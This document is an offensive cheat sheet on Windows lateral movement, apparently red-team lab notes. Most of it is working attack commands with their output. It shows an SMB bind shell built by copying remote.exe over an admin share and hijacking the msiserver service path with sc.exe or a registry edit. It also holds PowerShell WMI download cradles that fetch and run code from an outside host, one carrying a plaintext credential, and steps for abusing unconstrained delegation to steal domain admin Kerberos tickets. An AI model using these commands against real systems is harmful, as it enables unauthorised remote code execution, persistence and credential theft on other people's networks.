# Windows Lateral Movement

## Native SMB

### SMB Bind Shell via remote.exe & Service (SC)

1. **Move remote.exe to target**:
```
net use T: \\192.168.1.[x]\C$

move remote.exe T:\
```

2. **Target service to be started**
```
C:\Users\gte-1>sc.exe \\192.168.1.118 qc msiserver
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: msiserver
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\system32\msiexec.exe /V
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Installer
        DEPENDENCIES       : RpcSs
        SERVICE_START_NAME : LocalSystem
```

3. **Set Target Bin Path**
```
sc \\192.168.1.118 config msiserver binpath= "cmd.exe /C start /B C:\remote.exe /S cmd.exe pwnme"
```

4. **Check Target Bin Path**
```
C:\Users\gte-1>sc.exe \\192.168.1.118 qc msiserver
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: msiserver
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : cmd.exe /C /B C:\remote.exe /S cmd.exe pwnme
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Windows Installer
        DEPENDENCIES       : RpcSs
        SERVICE_START_NAME : LocalSystem
```

5. **Execute target remote.exe payload**
```
C:\Users\gte-1>sc.exe \\192.168.1.118 start msiserver
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

6. **Connect to SMB bind shell**
```
C:\Users\gte-1>"\\WIN-5696DUCBS1B\team-share\GTE-Labs\Day 4\Lab 2\remote.exe" /C
 192.168.1.118 "pwnme"
**************************************
***********     REMOTE    ************
***********     CLIENT    ************
**************************************
Connected...

]Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
**Remote: Connected to GTE-WIN7-1-PC gte-1 [Thu 8:50 AM]
```

7. **Clean Up Target**
```
C:\Users\gte-1>sc \\192.168.1.118 config msiserver binpath= "C:\WINDOWS\system32
\msiexec.exe /V"
[SC] ChangeServiceConfig SUCCESS

******ESCAPE QUOTES IF NEEDED******
sc \\192.168.1.177 config msiserver binpath= "\"C:\WINDOWS\system32\msiexec.exe /V\""
```

8. **Alt move patern via Reg Edit**
```
reg add \\192.168.1.177\hklm\system\currentcontrolset\services\msiserver /v ImagePath /t REG_EXPAND_SZ /d "cmd /c start /b c:\windows\system32\remote.exe /s cmd.exe pwnme" /f
```

## Powershell Lateral Movement

### WMI Internal Reverse Port Forward

Reverse portforward staged payload internal -> a download cradle

```powershell
Invoke-WmiMethod -ComputerName 43.*.*.* -Class Win32_Process -Name Create -ArgumentList "powershell.exe -w 1 -C `"&([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://43.*.*.*:10080/updates/updater'))-Join'')))`""
```

Reverse portforward staged payload internal -> a download cradle  -> with PS creds

```powershell
$credential = New-Object System.Management.Automation.PSCredential ("DA\some",("TestPassword" | ConvertTo-SecureString -AsPlainText -Force)); $cmd = "powershell.exe -w 1 -C `"&([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://test.com/download/test'))-Join'')))`""; Invoke-WmiMethod -ComputerName '43.160.34.168' -Credential $credential Win32_Process -Name 'Create' -ArgumentList $cmd
```

### Unconstrained delegation to attack DA or user credentials

Powershell and PowerView list of servers that allow for unconstrained delegation to attack DA or user credentials:

```powershell
powerpick Get-DomainComputer -Unconstrained
> Then e-mail DA with a 1x1px image to a UNC path.
    > TGS Service ticket is delivered to compromised server and stored in LSASS
    > Can extract and use TGT until it expires.
    > Can be used to get krbtgt
```
